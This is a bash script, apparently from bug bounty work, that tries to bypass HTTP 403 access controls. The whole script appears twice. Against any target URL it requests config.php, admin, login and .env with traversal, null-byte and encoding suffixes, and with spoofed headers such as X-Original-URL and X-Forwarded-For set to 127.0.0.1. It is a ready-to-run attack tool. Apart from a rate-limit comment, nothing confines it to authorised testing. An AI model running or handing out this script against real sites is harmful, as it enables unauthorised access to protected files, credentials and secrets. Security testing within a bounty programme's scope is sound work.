#!/bin/bash

# exampleBug Bounty 403 Bypass Tester
# Author: Cyber_pent
# Note: Keep requests ≤ 6/sec per exampleguidelines

# ---------- CONFIG ----------
TARGET=$1
WORDLIST=("config.php" "admin" "login" "index.php" ".env")

# Common 403 bypass payloads
BYPASS_PAYLOADS=(
  ""                           # normal
  "."                          # dot append
  ".."                         # double dot
  "%2e"                        # URL encoded dot
  "%2e%2e%2f"                  # directory traversal
  "%20"                        # space
  "%09"                        # tab
  "%00"                        # null byte
  "/"                          # trailing slash
  "/."                         # slash dot
  "//"                         # double slash
  "/.."                        # parent dir
  "?"                          # query mark
  "??"                         # double query
  ";/.."                       # semicolon trick
)

# Header-based bypass payloads
HEADERS=(
  "X-Original-URL: /"
  "X-Rewrite-URL: /"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-Host: 127.0.0.1"
  "X-Host: 127.0.0.1"
  "X-Forwarded-Scheme: http"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
)

# ---------- FUNCTIONS ----------
test_url() {
  local url=$1
  echo -e "\n[+] Testing: $url"
  curl -sk -o /dev/null -w "Code:%{http_code} Size:%{size_download}\n" "$url"
  sleep 0.2   # Rate limit: 5 req/sec
}

test_headers() {
  local url=$1
  for header in "${HEADERS[@]}"; do
    echo "[+] Testing Header: $header"
    curl -sk -o /dev/null -w "Code:%{http_code} Size:%{size_download}\n" -H "$header" "$url"
    sleep 0.2
  done
}

# ---------- MAIN ----------
if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <target-url>"
  echo "Example: $0 https://eample.com/config.php"
  exit 1
fi

for word in "${WORDLIST[@]}"; do
  for payload in "${BYPASS_PAYLOADS[@]}"; do
    test_url "${TARGET}/${word}${payload}"
  done
  # Test header-based bypasses
  test_headers "${TARGET}/${word}"
done
#!/bin/bash

# exampleBug Bounty 403 Bypass Tester
# Author: Cyber_pent
# Note: Keep requests ≤ 6/sec per exampleguidelines

# ---------- CONFIG ----------
TARGET=$1
WORDLIST=("config.php" "admin" "login" "index.php" ".env")

# Common 403 bypass payloads
BYPASS_PAYLOADS=(
  ""                           # normal
  "."                          # dot append
  ".."                         # double dot
  "%2e"                        # URL encoded dot
  "%2e%2e%2f"                  # directory traversal
  "%20"                        # space
  "%09"                        # tab
  "%00"                        # null byte
  "/"                          # trailing slash
  "/."                         # slash dot
  "//"                         # double slash
  "/.."                        # parent dir
  "?"                          # query mark
  "??"                         # double query
  ";/.."                       # semicolon trick
)

# Header-based bypass payloads
HEADERS=(
  "X-Original-URL: /"
  "X-Rewrite-URL: /"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-Host: 127.0.0.1"
  "X-Host: 127.0.0.1"
  "X-Forwarded-Scheme: http"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
)

# ---------- FUNCTIONS ----------
test_url() {
  local url=$1
  echo -e "\n[+] Testing: $url"
  curl -sk -o /dev/null -w "Code:%{http_code} Size:%{size_download}\n" "$url"
  sleep 0.2   # Rate limit: 5 req/sec
}

test_headers() {
  local url=$1
  for header in "${HEADERS[@]}"; do
    echo "[+] Testing Header: $header"
    curl -sk -o /dev/null -w "Code:%{http_code} Size:%{size_download}\n" -H "$header" "$url"
    sleep 0.2
  done
}

# ---------- MAIN ----------
if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <target-url>"
  echo "Example: $0 https://example.com/config.php"
  exit 1
fi

for word in "${WORDLIST[@]}"; do
  for payload in "${BYPASS_PAYLOADS[@]}"; do
    test_url "${TARGET}/${word}${payload}"
  done
  # Test header-based bypasses
  test_headers "${TARGET}/${word}"
done
